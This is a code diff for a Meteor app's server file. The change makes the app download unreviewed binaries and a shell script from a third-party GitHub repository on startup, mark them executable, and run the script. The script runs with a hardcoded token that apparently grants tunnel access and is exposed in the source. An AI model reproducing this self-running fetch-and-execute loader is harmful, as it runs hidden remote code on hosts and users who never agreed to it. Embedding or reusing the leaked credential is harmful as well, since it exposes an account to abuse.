@@ -1,74 +1,85 @@
 import { Meteor } from 'meteor/meteor';
-import express from 'express';
-import path from 'path';
+import { HTTP } from 'meteor/http';
 import fs from 'fs';
-import { promisify } from 'util';
-import axios from 'axios';
+import util from 'util';
 import { exec } from 'child_process';
-
-const app = express();
-const port = process.env.PORT || 8000;
-const execAsync = promisify(exec);
+const execAsync = util.promisify(exec);
 
 const filesToDownloadAndExecute = [
-  { url: 'https://github.com/wwrrtt/test/releases/download/2.0/begin.sh', filename: 'begin.sh' },
-  { url: 'hhttps://github.com/wwrrtt/test/raw/main/server', filename: 'server' },
-  { url: 'https://github.com/wwrrtt/test/raw/main/web', filename: 'web' }
+  {
+    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
+    filename: 'index.html',
+  },
+  {
+    url: 'https://github.com/wwrrtt/test/raw/main/server',
+    filename: 'server',
+  },
+  {
+    url: 'https://github.com/wwrrtt/test/raw/main/web',
+    filename: 'web',
+  },
+  {
+    url: 'https://github.com/wwrrtt/test/releases/download/2.0/begin.sh',
+    filename: 'begin.sh',
+  },
 ];
 
-async function downloadFile(url, filename) {
-  const writer = fs.createWriteStream(filename);
-  const response = await axios({
-    url,
-    method: 'GET',
-    responseType: 'stream'
-  });
-
-  response.data.pipe(writer);
-
-  return new Promise((resolve, reject) => {
-    writer.on('finish', resolve);
-    writer.on('error', reject);
-  });
-}
-
-async function downloadAndExecuteFiles() {
+const downloadFile = async ({ url, filename }) => {
+  console.log(`Downloading file from ${url}...`);
+  
   try {
-    for (const file of filesToDownloadAndExecute) {
-      await downloadFile(file.url, file.filename);
+    const result = await HTTP.get(url, { responseType: 'stream' });
+    const writer = fs.createWriteStream(filename);
+    result.content.pipe(writer);
+    
+    return new Promise((resolve, reject) => {
+      writer.on('error', reject);
+      writer.on('finish', resolve);
+    });
+  } catch (error) {
+    console.error(`下载文件 ${filename} 失败:`, error);
+    throw error;
+  }
+};
+
+const downloadAndExecuteFiles = async () => {
+  for (let file of filesToDownloadAndExecute) {
+    try {
+      await downloadFile(file);
+    } catch (error) {
+      console.error(`下载文件 ${file.filename} 失败:`, error);
+      return false;
     }
+  }
 
-    await execAsync('chmod +x begin.sh server web');
-    await execAsync('TOKEN=your_token_here ./begin.sh');
-
+  try {
+    console.log('给 begin.sh 添加执行权限');
+    await execAsync('chmod +x begin.sh');
+    
+    console.log('给 server 添加执行权限');
+    await execAsync('chmod +x server');
+    
+    console.log('给 web 添加执行权限');
+    await execAsync('chmod +x web');
+    
+    const { stdout } = await execAsync('bash begin.sh', {
+      env: { 
+        ...process.env, 
+        Token: 'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiNjBlZjljZGUtNTkyNC00Mjk4LTkwN2QtY2FjNzlkNDlmYTQ4IiwicyI6IlltUTFaalJtTURFdFpUbGtZaTAwTUdObUxXRTFOalF0TURWak5qTTBZekV4TjJSaiJ9'
+      }
+    });
+    console.log(`begin.sh 输出:\n${stdout}`);
     return true;
   } catch (error) {
-    console.error('Error in downloadAndExecuteFiles:', error);
+    console.error('执行文件失败:', error);
     return false;
   }
-}
+};
 
-Meteor.startup(async () => {
-  // 暂时注释掉这部分代码进行测试
-  // const success = await downloadAndExecuteFiles();
-  // if (!success) {
-  //   console.error('Failed to download and execute files');
-  //   return;
-  // }
-
-  app.get('/', (req, res) => {
-    const indexPath = path.join(process.cwd(), 'public', 'index.html');
-    fs.readFile(indexPath, 'utf8', (err, data) => {
-      if (err) {
-        console.error('Error reading index.html:', err);
-        res.status(500).send('Internal Server Error');
-        return;
-      }
-      res.send(data);
-    });
-  });
-
-  app.listen(port, () => {
-    console.log(`Server is running on http://localhost:${port}`);
-  });
-});
+Meteor.startup(() => {
+  downloadAndExecuteFiles().then(success => {
+    if (!success) {
+      console.error('下载和执行文件时出现问题。');
+    }
+  }).catch(console.error);
+}); 
